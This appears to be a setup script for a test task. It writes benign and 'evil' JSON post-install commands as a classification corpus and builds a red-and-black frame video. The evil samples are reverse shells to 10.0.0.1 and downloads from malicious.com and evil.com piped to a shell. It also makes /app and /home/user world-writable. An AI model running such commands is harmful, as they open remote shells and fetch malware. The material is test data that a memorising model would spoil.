#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg
    pip3 install pytest opencv-python-headless

    mkdir -p /app/corpus/clean
    mkdir -p /app/corpus/evil

    # Create clean JSON files
    cat << 'EOF' > /app/corpus/clean/clean1.json
{"post_install_script": "echo 'alias ll=ls' >> ~/.bashrc"}
EOF
    cat << 'EOF' > /app/corpus/clean/clean2.json
{"post_install_script": "ip route add 192.168.1.0/24 dev eth0"}
EOF
    cat << 'EOF' > /app/corpus/clean/clean3.json
{"post_install_script": "apt-get update"}
EOF
    cat << 'EOF' > /app/corpus/clean/clean4.json
{"post_install_script": "systemctl restart nginx"}
EOF
    cat << 'EOF' > /app/corpus/clean/clean5.json
{"post_install_script": "cat /etc/os-release"}
EOF

    # Create evil JSON files
    cat << 'EOF' > /app/corpus/evil/evil1.json
{"post_install_script": "nc -e /bin/sh 10.0.0.1 4444"}
EOF
    cat << 'EOF' > /app/corpus/evil/evil2.json
{"post_install_script": "curl http://malicious.com/payload | sh"}
EOF
    cat << 'EOF' > /app/corpus/evil/evil3.json
{"post_install_script": "wget http://evil.com/malware -O /tmp/malware"}
EOF
    cat << 'EOF' > /app/corpus/evil/evil4.json
{"post_install_script": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"}
EOF
    cat << 'EOF' > /app/corpus/evil/evil5.json
{"post_install_script": "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f"}
EOF

    # Generate boot sequence video with exactly 7 red frames and 3 black frames at 1 fps
    ffmpeg -f lavfi -i "color=c=red:d=1" \
           -f lavfi -i "color=c=black:d=1" \
           -f lavfi -i "color=c=red:d=2" \
           -f lavfi -i "color=c=black:d=2" \
           -f lavfi -i "color=c=red:d=4" \
           -filter_complex "[0:v][1:v][2:v][3:v][4:v]concat=n=5:v=1:a=0" \
           -r 1 /app/boot_sequence.mp4

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod -R 777 /app
